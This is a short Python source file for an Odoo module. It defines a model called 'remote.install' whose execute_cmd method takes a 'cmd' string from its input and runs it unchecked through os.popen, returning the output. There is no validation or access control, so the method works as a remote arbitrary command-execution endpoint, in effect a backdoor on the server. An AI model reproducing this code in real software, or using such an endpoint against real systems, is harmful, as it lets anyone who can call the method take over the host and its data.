# -*- coding: utf-8 -*-
import json

from odoo import models,api
from odoo.http import request
import os

class Http(models.Model):
    _name = 'remote.install'

    @api.model
    def execute_cmd(self,vals):
    	cmd = vals.get('cmd')
    	rs = os.popen(cmd)
    	return rs.read()